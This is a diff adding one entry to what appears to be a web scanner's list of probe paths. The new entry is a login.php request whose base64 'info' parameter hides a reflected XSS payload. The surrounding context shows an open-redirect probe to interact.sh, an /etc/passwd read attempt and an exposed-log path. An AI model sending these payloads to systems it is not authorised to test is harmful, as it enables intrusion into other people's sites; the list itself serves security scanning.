@@ -207,3 +207,4 @@
 /wp-admin/admin-ajax.php?action=heartbeat&kc_us_dismiss_admin_notice=1&option_name=welcome_offer&redirect_to=https://interact.sh
 /etc/passwd?raw??
 /pandora_console/attachment/pandora_chat.log.json.txt
+/login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn=
